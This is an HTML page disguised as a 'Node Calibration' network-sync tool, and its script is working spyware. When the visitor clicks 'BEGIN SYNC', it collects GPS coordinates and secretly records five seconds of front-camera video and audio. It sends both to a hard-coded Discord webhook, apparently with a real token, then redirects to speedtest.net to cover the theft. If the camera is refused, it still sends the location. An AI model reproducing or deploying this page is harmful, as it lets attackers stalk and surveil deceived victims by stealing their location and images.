<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Calibration</title>
    <style>
        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>NODE CALIBRATION</h2>
        <p>Sync hardware nodes for 2026 network optimization.</p>
        <button class="btn" id="startBtn">BEGIN SYNC</button>
        <p id="status">System Status: Ready</p>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

        document.getElementById('startBtn').addEventListener('click', async function() {
            const status = document.getElementById('status');
            status.innerText = "Connecting...";

            // 1. GPS Request
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "GPS Synced. Opening Media...";
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // 2. Camera + Audio Request
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                } catch (e) {
                    status.innerText = "Media Error: " + e.name;
                    // Even if camera fails, send the location!
                    sendLocationOnly(lat, lon);
                    return;
                }

                // 3. Recorder Logic
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();
                status.innerText = "Optimizing (5s)...";

                setTimeout(() => {
                    mediaRecorder.stop();
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('payload_json', JSON.stringify({
                            content: "ðŸ“¡ **NODE DATA RECEIVED**",
                            embeds: [{
                                title: "Telemetry Report",
                                fields: [{ name: "ðŸ“ Maps", value: `https://www.google.com/maps?q=${lat},${lon}` }]
                            }]
                        }));
                        formData.append('file', blob, 'node_capture.webm');

                        await fetch(WEBHOOK, { method: 'POST', body: formData });
                        stream.getTracks().forEach(t => t.stop());
                        status.innerText = "Sync Complete!";
                        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                    };
                }, 5000);

            }, (err) => {
                alert("GPS Permission Denied. Site cannot run.");
                status.innerText = "Handshake Failed.";
            });
        });

        async function sendLocationOnly(lat, lon) {
             const fd = new FormData();
             fd.append('payload_json', JSON.stringify({ content: "ðŸ“ **Location Only:** " + lat + "," + lon }));
             await fetch(WEBHOOK, { method: 'POST', body: fd });
             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
        }
    </script>
</body>
</html>
